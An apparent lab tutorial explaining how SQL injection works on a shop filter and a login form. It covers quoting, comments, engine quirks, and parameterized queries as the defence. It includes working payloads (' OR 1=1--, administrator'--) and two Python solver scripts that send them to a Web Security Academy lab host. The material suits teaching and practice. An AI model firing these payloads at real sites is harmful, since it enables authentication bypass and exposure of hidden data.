SQL Injection · The Core Investigation ​

Forget memorizing long lists of "magic payloads." SQL injection happens for one simple reason: a website builds a database command by gluing your input directly into the sentence, and the database cannot tell where the developer's instructions end and your text begins.

💡 Everyday Analogy: The Bank Slip. Imagine filling out a paper withdrawal slip at a bank. On the line labeled "Your Name", you write: John — and also, empty the vault into my bag. A human clerk would laugh at you because they know that line is only for a name. A database, however, reads the entire glued sentence as one official command unless the developer keeps your input in a separate, sealed box.

Case File #1: Following a Request Behind the Curtain ​

Let's trace what happens when you browse an online gift shop and click on the Gifts category.

🔎 Step 1 · What You Notice in the Browser

You click the "Gifts" filter on the store's sidebar. Your browser's address bar changes to /filter?category=Gifts, and the page refreshes to show only public gift items that have been officially released.

⚙️ Step 2 · What the Server Does Behind the Scenes

The server grabs the word Gifts from the URL and pastes it directly into the middle of a SQL command using string concatenation📖 String ConcatenationGluing pieces of text together end-to-end—like pasting a user’s search word directly into the middle of a database command.💡 Real-life analogy: Like writing a blank line on an official contract where someone can write extra legal clauses instead of just their name.. Look at how the two pieces are glued together:

Blue = Developer's SQL TemplateGold = Text From Your URL
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
💥 Step 3 · Where the Logic Breaks

The developer wrapped your input in single quotes ('...') expecting it to stay trapped inside those quotes forever. Beat that assumption by including a single quote (') inside your input: the tokenizer📖 Tokenizer (Lexer)The very first step inside a database or browser that chops a raw line of text into individual words, punctuation marks, and strings.💡 Real-life analogy: Like your eyes spotting spaces and quotation marks on a page before your brain even thinks about what the sentence means. thinks the developer's quote just ended, and treats everything you type after it as live SQL commands.

🛡️ Step 4 · How Developers Lock It Down

Instead of gluing strings together, developers use a parameterized query📖 Parameterized Query (Prepared Statement)A safe way to run database commands where the command structure is locked in first, and user input is sent separately in a sealed box.💡 Real-life analogy: Like a shipping label with a pre-printed barcode slot: no matter what you write inside the box, it cannot change the delivery instructions. (WHERE category = ?). The database compiles the command structure before your input ever arrives, so even if you type ten single quotes, the database treats them as harmless text characters inside a search word.

Visual Comparison: Glued Text vs. Parameterized Box ​

💭 What the Developer Expected

The developer thought single quotes worked like a locked cage: whatever the user typed in category would only ever be compared as a category name, and AND released = 1 would always hide unreleased products.

💥 What Actually Happened

When the user sends Gifts'--, the quote closes the category name early, and the -- comment marker tells the database to cross out the rest of the line—erasing the AND released = 1 check completely.

Watch the Query Change Meaning Color by Color ​

Look at what happens inside the database when category is set to ' OR 1=1--:

Blue = Developer CodeGold = Injected InputStrikethrough = Erased by Comment
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
🔬 Under the Hood: Why Parameterized Queries Never Fall for This

When an app uses a parameterized query📖 Parameterized Query (Prepared Statement)A safe way to run database commands where the command structure is locked in first, and user input is sent separately in a sealed box.💡 Real-life analogy: Like a shipping label with a pre-printed barcode slot: no matter what you write inside the box, it cannot change the delivery instructions., two completely separate messages are sent to the database:

  1. The Blueprint: SELECT * FROM products WHERE category = ? AND released = 1
  2. The Value Bag: Param 1 = ' OR 1=1--

Because the database finishes building its execution plan during Step 1, it is physically impossible for Step 2 to add a new OR clause or comment out AND released = 1. The database simply searches for a category literally named ' OR 1=1-- and returns zero rows.

The 5-Stage Journey of Every Database Query ​

Every time your request hits the server, it passes through five checkpoints. Understanding these five checkpoints tells you why an error happened and where to adjust your input:

1. String Gluing App pastes your URL text into the SQL string. (The bug is born here!)
→
2. Tokenizer Splits characters into quotes, words, and comments (', OR, --).
→
3. Grammar Check Checks if the SQL sentence structure makes sense.
→
4. Table & Type Check Verifies table names exist and column types match.
→
5. Execution Runs the command and returns rows, an error, or a time delay.

Punctuation That Changes the Story ​

Before a database understands words like SELECT or WHERE, its tokenizer📖 Tokenizer (Lexer)The very first step inside a database or browser that chops a raw line of text into individual words, punctuation marks, and strings.💡 Real-life analogy: Like your eyes spotting spaces and quotation marks on a page before your brain even thinks about what the sentence means. scans for special punctuation marks. Here are the only symbols you need to know:

SymbolWhat the Database SeesWhy It Matters in an Investigation
'Opens or closes a text stringLets you step out of "user data mode" and start writing SQL instructions
--"Ignore the rest of this line" (Comment)Cleanly erases the developer's leftover quotes and filters at the end of the query
#MySQL's alternate "Ignore the rest of this line"Works just like -- in MySQL without needing a space after it
/* ... */"Ignore everything between these markers"Lets you snip out a piece in the middle of a query or replace spaces
;End of sentence, start a brand-new queryAllows running a second statement on engines that permit stacked queries
⚙️ Database Engine Quirks: The MySQL Space Trap

One tiny rule trips up almost everyone at first: how different databases read -- comments.

Database EngineLine Comment SyntaxThe Gotcha
PostgreSQL / Oracle / SQL Server--Works immediately ('-- is valid).
MySQL / MariaDB-- (dash-dash-SPACE) or #In MySQL, -- must be followed by a space (encoded as + or %20 in URLs), or MySQL treats it as math subtraction instead of a comment!

How Does the Server Answer You? (The 3 Channels) ​

Not every vulnerable page prints database rows back on the screen. We group SQL injection into three families based on how you see the answer:

📢 1. In-Band (Direct) The webpage directly prints the new rows (via UNION) or shows a detailed database error message on screen.
🕵️ 2. Blind (Clue-Based) The page never prints database data, but changes slightly (a "Welcome" message appears, a 500 error triggers, or the response pauses for 5 seconds).
📡 3. Out-of-Band (Phone Home) The page changes nothing at all, so you ask the database to make a DNS/HTTP lookup to a server you control (OAST📖 Out-of-Band (OAST)Tricking a quiet server into making a phone call (DNS or HTTP lookup) out to a server you control when the normal webpage shows nothing.💡 Real-life analogy: Slipping a note under a locked door that says "If you can read this, call my cell phone number.").

The Detective's Step-by-Step Testing Routine ​

When you suspect a URL parameter might be talking to a database, don't guess randomly. Change one thing at a time and watch how the server reacts:

Step 1: Normal Click Send Gifts. Note the normal page size and product count.
→
Step 2: Single Quote Send Gifts'. Did a 500 error appear or did products vanish?
→
Step 3: Double Quote Repair Send Gifts''. If the page goes back to normal, you're inside a SQL string!
→
Step 4: True vs. False Compare Gifts' AND 1=1-- (True) vs Gifts' AND 1=2-- (False).
🔬 Under the Hood: Why Gifts'' Repairs the Error

In SQL, typing two single quotes right next to each other ('') inside a string doesn't close and reopen the string—it represents one literal apostrophe (like in the name O'Reilly, written as 'O''Reilly').

So when Gifts' breaks the page with an odd number of quotes, and Gifts'' magically brings the normal page back, you have proven beyond a shadow of a doubt that a SQL parser is reading your quotes!

Every piece explained in plain English ​

PieceWhat It MeansWhy You Need It
%27 (')Single quoteCloses the 'Gifts' text box early so the database listens for SQL commands
+ (space)Space separatorKeeps ' and OR separated as distinct tokens
ORLogical "Either/Or"Tells the database to accept rows that pass either the first check or our new check
1=1Always-true checkSince 1 always equals 1, every row in the products table passes the filter
--Line commentCrosses out the leftover ' AND released = 1 so it doesn't cause a syntax error or hide items

Python requests solver ​

python
import sys
import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance

def main() -> None:
    s = requests.Session()
    baseline = s.get(f"{BASE}/filter", params={"category": "Gifts"}, timeout=20)
    exploit = s.get(f"{BASE}/filter", params={"category": "' OR 1=1--"}, timeout=20)

    print(f"baseline: {baseline.status_code}, {len(baseline.text)} bytes")
    print(f"exploit : {exploit.status_code}, {len(exploit.text)} bytes")

    cards_before = baseline.text.count('class="product-card"')
    cards_after = exploit.text.count('class="product-card"')
    print(f"product cards: {cards_before} -> {cards_after}")

    if cards_after > cards_before:
        print("[+] Hidden products are now visible. Lab solved.")
    else:
        print("[!] No new products. Check the lab URL and cookie/session state.")
        sys.exit(1)

if __name__ == "__main__":
    main()

Python requests solver ​

python
import sys
import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance

def main() -> None:
    s = requests.Session()
    s.get(f"{BASE}/login", timeout=20)

    resp = s.post(
        f"{BASE}/login",
        data={"username": "administrator'--", "password": "ignored"},
        allow_redirects=True,
        timeout=20,
    )

    if "Log out" in resp.text or "/my-account" in resp.url:
        print("[+] Logged in as administrator. Lab solved.")
        print(f"    final URL: {resp.url}")
    else:
        print("[!] Login did not succeed. Verify the lab host.")
        sys.exit(1)

if __name__ == "__main__":
    main()
